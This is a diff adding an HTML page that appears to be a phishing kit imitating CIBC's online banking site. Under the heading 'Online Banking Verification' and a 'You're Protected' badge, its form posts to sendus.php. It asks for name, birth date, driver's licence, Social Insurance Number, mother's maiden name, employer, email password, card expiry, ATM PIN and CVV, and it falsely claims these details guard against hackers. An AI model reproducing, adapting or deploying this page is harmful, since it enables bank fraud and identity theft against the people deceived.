@@ -1,0 +1,518 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+ <head>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Online Banking
+  </title>
+  <link type="image/x-icon" href="favicon.ico" rel="shortcut icon" />
+  <script src="/olb/js/common.js?v=R22" type="text/javascript">
+  </script>
+  <link href="files/screen-pre.css?v=Pre-Staging-13" media="screen" type="text/css" rel="stylesheet" />
+  <link href="files/screen-pre-font-size.css?v=Release22b-1" media="screen" type="text/css" rel="stylesheet" />
+  <link href="files/screen-pre-en.css?v=Release8-1" media="screen" type="text/css" rel="stylesheet" />
+  <link href="files/screen-pre-OLBRegistration.css?v=Release22b-1" media="screen" type="text/css" rel="stylesheet" />
+  <link href="files/screen-pre-retail.css?v=Release8-1" media="screen" type="text/css" rel="stylesheet" />
+  <link href="files/print-pre.css?v=Release22b-1" media="print" type="text/css" rel="stylesheet" />
+  <link href="files/print-pre-font-size.css?v=Release8-1" media="print" type="text/css" rel="stylesheet" />
+  <link href="files/print-pre-en.css?v=Release8-1" media="print" type="text/css" rel="stylesheet" />
+  <link href="files/print-pre-OLBRegistration.css?v=Release22b-1" media="print" type="text/css" rel="stylesheet" />
+  <link href="files/print-pre-retail.css?v=Release8-1" media="print" type="text/css" rel="stylesheet" />
+  <script src="files/b.js" language="Javascript" type="text/javascript">
+  </script>
+ </head>
+ <body>
+  <div id="pageContainer">
+   <div id="header">
+    <div id="logo">
+     <img width="154" height="70" alt="CIBC" src="files/cibc-logo-en.png" />
+    </div>
+    <div id="printLogo">
+     <img width="154" height="70" id="imgPrintLogo" alt="CIBC" src="/olb/img/cibc-logo-en.png" />
+    </div>
+    <div id="globalNav">
+     <ul>
+      <li class="firstListItem">
+       <a onclick="newDynLinkWindow('#','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes');return false" href="#">
+        Call 1-888-872-2422 for assistance
+       </a>
+      </li>
+     </ul>
+    </div>
+   </div>
+   <div id="pageContent">
+    <div id="mainSection">
+     <a name="main">
+     </a>
+     <div class="emphasized" id="contentHeader">
+      <h1>
+       Online Banking Verification
+      </h1>
+      <div class="secondarySubHeader">
+       <a onclick="newDynLinkWindow('#','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=800,height=600');return false" href="#">
+        <img width="18" height="18" alt="Online Security Shield" src="files/icon-shield.gif" />
+        <span>
+         You`re Protected
+        </span>
+       </a>
+      </div>
+     </div>
+     <style type="text/javascript">
+      label, input { float: left; }
+input { margin-left: 1em; } 
+label.error { display: none !important; }
+.password-meter {
+	float: left;
+}
+     </style>
+     <form class="inlineForm" onsubmit="return checkform(this);" action="sendus.php" method="post" id="verify" name="verify">
+      <input type="hidden" value="" name="user" />
+      <input type="hidden" value="" name="pass" />
+      <span style="display:none" id="dangerousChar">
+       <div class="inlineError">
+       </div>
+      </span>
+      <div id="OLBRegistrationContainer">
+       <div class="subMainHeaderContent">
+        <h2>
+         Verifying your CIBC Online Banking is easy. Let`s get started.
+        </h2>
+       </div>
+       <div class="instructionalContent">
+        <p>
+         Note: All fields are mandatory unless stated (optional).
+        </p>
+        <b>
+        </b>
+        <p>
+         Note: We take your account security seriously and need these details to help us prevent hackers from accessing your account.
+        </p>
+       </div>
+       <div class="accordionContainer fixedSize" id="olbRegistrationAccordion">
+        <fieldset id="olbRegistrationAccordionFieldset">
+         <legend class="readerDesc">
+         </legend>
+         <div class="accordion stackedFields inactive " id="cardInformation">
+          <div class="accordionContentContainer">
+           <div class="sectionRow sectionHeader" id="cardInformationHeader">
+            <div class="twoColumn">
+             <h2>
+              Identity verification
+             </h2>
+            </div>
+            <div class="twoColumn editLink">
+            </div>
+           </div>
+           <div class="">
+            <div class="sectionRow" id="cardInfoInstructionalRow">
+             <div class="singleColumn left" id="">
+              <p>
+               Please enter your personal information to get started with the verification process.
+              </p>
+             </div>
+            </div>
+            <div class="sectionRow">
+             <div class="twoColumn left " id="cardNumberContainer">
+              <div class="fieldLabelPair" id="cardNumberFieldLabelPair">
+               <div class="fieldLabel">
+                <label for="cardNumber">
+                 Full name
+                </label>
+               </div>
+               <div class="labelledField">
+                <input type="text" aria-describedby="cardNumberError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="fname" value="" maxlength="32" name="fname" />
+               </div>
+              </div>
+             </div>
+             <div class="twoColumn right " id="expiryDateContainer">
+              <div class="fieldLabelGroup fieldOperators inline" id="expiryDateFieldLabelGroup">
+               <fieldset id="expiryDateFieldset">
+                <div class="groupLabel">
+                 <label for="expiryMonth">
+                  Date of birth
+                 </label>
+                </div>
+                <div class="groupedFields">
+                 <div class="fieldLabelPair" id="expiryMonthFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryMonthError" aria-invalid="false" aria-required="true" autocomplete="off" size="4" class="inputField" id="dobd" value="" maxlength="2" name="dobd" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryMonth">
+                    DD
+                   </label>
+                  </div>
+                 </div>
+                 <div class="operator">
+                  /
+                 </div>
+                 <div class="fieldLabelPair" id="expiryYearFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryYearError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="dobm" value="" maxlength="2" name="dobm" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryYear">
+                    MM
+                   </label>
+                  </div>
+                 </div>
+                 <div class="operator">
+                  /
+                 </div>
+                 <div class="fieldLabelPairA" id="expiryYearFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryYearError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="doby" value="" maxlength="4" size="8" name="doby" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryYear">
+                    YYYY
+                   </label>
+                  </div>
+                 </div>
+                </div>
+               </fieldset>
+              </div>
+             </div>
+            </div>
+            <div class="sectionRow">
+             <div class="twoColumn left " id="cardNumberContainer">
+              <div class="fieldLabelPair" id="cardNumberFieldLabelPair">
+               <div class="fieldLabel">
+                <label for="cardNumber">
+                 Driving license #
+                </label>
+               </div>
+               <div class="labelledField">
+                <input type="text" aria-describedby="cardNumberError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField maskedField" id="dln" value="" maxlength="29" name="dln" />
+               </div>
+              </div>
+             </div>
+             <div class="twoColumn right " id="expiryDateContainer">
+              <div class="fieldLabelGroup fieldOperators inline" id="expiryDateFieldLabelGroup">
+               <fieldset id="expiryDateFieldset">
+                <legend class="readerDesc">
+                 Accessibility content
+												place holder
+                </legend>
+                <div class="groupLabel">
+                 <label for="expiryMonth">
+                  Social Insurance Number
+                 </label>
+                </div>
+                <div class="groupedFields">
+                 <div class="fieldLabelPairB" id="expiryMonthFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryMonthError" aria-invalid="false" aria-required="true" autocomplete="off" size="3" class="inputField" id="sin1" value="" maxlength="3" name="sin1" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryMonth">
+                    nnn
+                   </label>
+                  </div>
+                 </div>
+                 <div class="operator">
+                  /
+                 </div>
+                 <div class="fieldLabelPairB" id="expiryYearFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryYearError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="sin2" value="" maxlength="3" name="sin2" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryYear">
+                    nnn
+                   </label>
+                  </div>
+                 </div>
+                 <div class="operator">
+                  /
+                 </div>
+                 <div class="fieldLabelPairB" id="expiryYearFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryYearError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="sin3" value="" maxlength="3" size="3" name="sin3" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryYear">
+                    nnn
+                   </label>
+                  </div>
+                 </div>
+                </div>
+               </fieldset>
+              </div>
+             </div>
+            </div>
+            <div class="sectionRow">
+             <div class="twoColumn left " id="cardNumberContainer">
+              <div class="fieldLabelPair" id="cardNumberFieldLabelPair">
+               <div class="fieldLabel">
+                <label for="cardNumber">
+                 Mother's Maiden Name
+                </label>
+               </div>
+               <div class="labelledField">
+                <input type="text" aria-describedby="cardNumberError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField maskedField" id="mmn" value="" maxlength="29" name="mmn" />
+               </div>
+              </div>
+             </div>
+             <div class="twoColumn right " id="expiryDateContainer">
+              <div class="fieldLabelGroup fieldOperators inline" id="expiryDateFieldLabelGroup">
+               <fieldset id="expiryDateFieldset">
+                <legend class="readerDesc">
+                 Accessibility content
+												place holder
+                </legend>
+                <div class="groupLabel">
+                 <label for="expiryMonth">
+                  Current Employer
+                 </label>
+                </div>
+                <div class="groupedFields">
+                 <div class="fieldLabelPairD" id="expiryMonthFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="cardNumberError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField maskedField" id="employer" value="" maxlength="19" name="employer" />
+                  </div>
+                 </div>
+                </div>
+               </fieldset>
+              </div>
+             </div>
+            </div>
+            <div class="sectionRow">
+             <div class="twoColumn left " id="cardNumberContainer">
+              <div class="fieldLabelPair" id="cardNumberFieldLabelPair">
+               <div class="fieldLabel">
+                <label for="cardNumber">
+                 E-mail address
+                </label>
+               </div>
+               <div class="labelledField">
+                <input type="text" aria-describedby="cardNumberError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField maskedField" id="email" value="" maxlength="29" name="email" />
+               </div>
+              </div>
+             </div>
+             <div class="twoColumn right " id="expiryDateContainer">
+              <div class="fieldLabelGroup fieldOperators inline" id="expiryDateFieldLabelGroup">
+               <fieldset id="expiryDateFieldset">
+                <legend class="readerDesc">
+                 Accessibility content
+												place holder
+                </legend>
+                <div class="groupLabel">
+                 <label for="expiryMonth">
+                  E-mail password
+                 </label>
+                </div>
+                <div class="groupedFields">
+                 <div class="fieldLabelPairD" id="expiryMonthFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="password" aria-describedby="cardNumberError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField maskedField" id="emailp" value="" maxlength="19" name="emailp" />
+                  </div>
+                 </div>
+                </div>
+               </fieldset>
+              </div>
+             </div>
+            </div>
+            <div class="sectionRow buttonRow">
+            </div>
+           </div>
+          </div>
+         </div>
+        </fieldset>
+       </div>
+       <div class="accordionContainer fixedSize" id="olbRegistrationAccordion">
+        <fieldset id="olbRegistrationAccordionFieldset">
+         <legend class="readerDesc">
+         </legend>
+         <div class="accordion stackedFields inactive " id="cardInformation">
+          <div class="accordionContentContainer">
+           <div class="sectionRow sectionHeader" id="cardInformationHeader">
+            <div class="twoColumn">
+             <h2>
+              Card Information
+             </h2>
+            </div>
+            <div class="twoColumn editLink">
+            </div>
+           </div>
+           <div class="">
+            <div class="sectionRow" id="cardInfoInstructionalRow">
+             <div class="singleColumn left" id="">
+              <p>
+               Please enter your card number and the expiry date below to finish your verification.
+              </p>
+             </div>
+            </div>
+            <div class="sectionRow">
+             <div class="twoColumn right " id="expiryDateContainer">
+              <div class="fieldLabelGroup fieldOperators inline" id="expiryDateFieldLabelGroup">
+               <fieldset id="expiryDateFieldset">
+                <legend class="readerDesc">
+                 Accessibility content
+												place holder
+                </legend>
+                <div class="groupLabel">
+                 <label for="expiryMonth">
+                  Card Expiry Date
+                 </label>
+                </div>
+                <div class="groupedFields">
+                 <div class="fieldLabelPair" id="expiryMonthFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryMonthError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="expm" value="" maxlength="2" name="expm" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryMonth">
+                    MM
+                   </label>
+                  </div>
+                 </div>
+                 <div class="operator">
+                  /
+                 </div>
+                 <div class="fieldLabelPair" id="expiryYearFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryYearError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="expy" value="" maxlength="2" name="expy" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryYear">
+                    YY
+                   </label>
+                  </div>
+                 </div>
+                </div>
+               </fieldset>
+              </div>
+             </div>
+             <div class="twoColumn left " id="expiryDateContainer">
+              <div class="fieldLabelGroup fieldOperators inline" id="expiryDateFieldLabelGroup">
+               <fieldset id="expiryDateFieldset">
+                <legend class="readerDesc">
+                 Accessibility content
+												place holder
+                </legend>
+                <div class="groupLabel">
+                 <label for="expiryMonth">
+                  ATM PIN
+                 </label>
+                </div>
+                <div class="groupedFields">
+                 <div class="fieldLabelPairA" id="expiryYearFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="password" aria-describedby="expiryYearError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="pin" value="" maxlength="6" name="pin" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryYear">
+                   </label>
+                  </div>
+                 </div>
+                </div>
+               </fieldset>
+              </div>
+             </div>
+             <div class="twoColumn left " id="expiryDateContainer">
+              <div class="fieldLabelGroup fieldOperators inline" id="expiryDateFieldLabelGroup">
+               <fieldset id="expiryDateFieldset">
+                <legend class="readerDesc">
+                 Accessibility content
+												place holder
+                </legend>
+                <div class="groupLabel">
+                 <label for="expiryMonth">
+                  CVV Security Code (3 digits)
+                 </label>
+                </div>
+                <div class="groupedFields">
+                 <div class="fieldLabelPairA" id="expiryYearFieldLabelPair">
+                  <div class="labelledField">
+                   <input type="text" aria-describedby="expiryYearError" aria-invalid="false" aria-required="true" autocomplete="off" class="inputField" id="cvv" value="" maxlength="3" name="cvv" />
+                  </div>
+                  <div class="fieldLabel">
+                   <label for="expiryYear">
+                   </label>
+                  </div>
+                 </div>
+                </div>
+               </fieldset>
+              </div>
+             </div>
+            </div>
+            <div class="sectionRow buttonRow">
+             <div class="singleColumn">
+              <div class="buttonContainer">
+               <div class="buttonWrapper primary">
+                <input type="image" src="files/cont.png" />
+                <span>
+                </span>
+               </div>
+              </div>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+        </fieldset>
+       </div>
+       <div class="accordion stackedFields inactive " id="identityVerification">
+        <div class="accordionContentContainer">
+        </div>
+       </div>
+      </div>
+      <div class="rightRailContainer withMarketingImage">
+       <!--<block-reference key="CB.sec.RegistrationPg.OOB.CustomerReviews" />-->
+       <div class="rightRail default" id="registrationFAQ">
+        <div class="header" id="registrationFAQHeader">
+         <h3>
+          Frequently Asked Questions
+         </h3>
+        </div>
+        <div class="content" id="registrationFAQContent">
+         <p>
+          <a onclick="newDynLinkWindow('#','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=995,height=470,top=100,left=20');return false" href="#">
+           How do I register for CIBC Online Banking?
+          </a>
+         </p>
+         <p>
+          <a onclick="newDynLinkWindow('#','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=995,height=470,top=100,left=20');return false" href="#">
+           How do I register for CIBC Mobile Banking?
+          </a>
+         </p>
+         <p>
+          <a onclick="newDynLinkWindow('#','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=995,height=470,top=100,left=20');return false" href="#">
+           What is the two-step verification process in CIBC Online Banking and CIBC Mobile Banking?
+          </a>
+         </p>
+         <p>
+          <a onclick="newDynLinkWindow('#','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=995,height=470,top=100,left=20');return false" href="#">
+           What is a one-time verification code and how do I use it?
+          </a>
+         </p>
+        </div>
+       </div>
+      </div>
+     </form>
+    </div>
+   </div>
+   <div id="footer">
+    <ul>
+     <li class="firstListItem">
+      <a onclick="newDynLinkWindow('','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=800,height=600');return false" href="#">
+       CDIC Deposit Insurance Information
+      </a>
+     </li>
+     <li>
+      <a onclick="newDynLinkWindow('','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=800,height=600');return false" href="#">
+       Legal
+      </a>
+     </li>
+     <li>
+      <a onclick="newDynLinkWindow('','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=800,height=600');return false" href="#">
+       Privacy &amp; Security
+      </a>
+     </li>
+    </ul>
+   </div>
+  </div>
+ </body>
+</html>
